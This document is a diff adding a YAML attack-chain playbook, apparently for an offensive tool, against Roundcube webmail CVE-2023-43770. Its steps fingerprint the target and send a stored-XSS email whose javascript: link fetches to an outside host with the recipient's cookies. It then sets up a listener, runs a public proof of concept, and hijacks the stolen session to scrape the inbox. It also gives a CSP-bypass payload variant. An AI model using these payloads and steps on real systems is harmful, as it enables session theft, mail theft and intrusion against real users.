@@ -1,0 +1,75 @@
+chain_id: roundcube_cve_2023_43770
+title: "Roundcube Webmail — CVE-2023-43770 stored XSS in plaintext message body"
+severity: HIGH
+tags: [web, roundcube, webmail, cve-2023-43770, xss, session-steal]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2023-43770" }
+    - { banner_pattern: "(?i)roundcube" }
+    - { product_pattern: "(?i)roundcube" }
+    - { path_pattern: "(?i)/(roundcube|webmail|mail)/\\?_task=" }
+
+description: |
+  Roundcube < 1.4.14 / 1.5.4 / 1.6.3 fails to sanitize linkrefs inside
+  plaintext mail bodies — `[X](javascript:...)` survives into rendered
+  HTML, executing in the recipient's session. CISA flagged this with
+  active exploitation against EU government webmail in Feb 2024.
+  Useful for harvesting recipient cookies → session hijack → mail
+  theft → onward AD foothold via OWA-style phishing.
+
+steps:
+  - id: 1
+    title: "Confirm Roundcube version (login page leaks it)"
+    command: |
+      curl -sk "https://$VICTIMA/?_task=login" | grep -Eo 'roundcube[^"]*[0-9]+\\.[0-9]+'
+      curl -sk "https://$VICTIMA/program/resources/version.txt"
+
+  - id: 2
+    title: "Compose the malicious mail body (linkref XSS)"
+    command: |
+      cat > /tmp/payload.eml <<'EML'
+      From: rootctl@evil.example
+      To: victim@target.example
+      Subject: rootctl
+      Content-Type: text/plain; charset=us-ascii
+
+      Hello! See [click me][1] for details.
+
+      [1]: javascript:fetch('https://10.0.2.15/x?c='+document.cookie)
+      EML
+      swaks --to victim@target.example --server $VICTIMA --data /tmp/payload.eml
+
+  - id: 3
+    title: "Listener for the cookie callback"
+    command: |
+      python3 -m http.server 443 --bind 0.0.0.0 &
+      tail -F access.log
+
+  - id: 4
+    title: "Public PoC (full chained kill — phish + XSS + OAuth steal)"
+    command: |
+      git clone https://github.com/Sentinel-One/CVE-2023-43770 /tmp/rcube
+      python3 /tmp/rcube/poc.py --target https://$VICTIMA \
+        --victim victim@target.example --listener https://10.0.2.15
+
+  - id: 5
+    title: "Once you have the session cookie, hijack it"
+    command: |
+      # Set the leaked cookie in your browser:
+      #   roundcube_sessid=<value>
+      # Visit https://$VICTIMA/?_task=mail — already logged in.
+      # Or scrape via API:
+      curl -sk -b 'roundcube_sessid=<value>' \
+        "https://$VICTIMA/?_task=mail&_action=list&_mbox=INBOX"
+
+common_errors:
+  - error: "XSS does not fire — Content-Security-Policy blocks inline JS"
+    solution: |
+      Some Roundcube deployments behind reverse proxies inject CSP
+      headers. Bypass with image-onerror form: `[x](#" onerror="...)`
+      — different mutation, same parser bug.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2023-43770
+  - https://www.cisa.gov/news-events/alerts/2024/02/12/cisa-adds-one-known-exploited-vulnerability-catalog
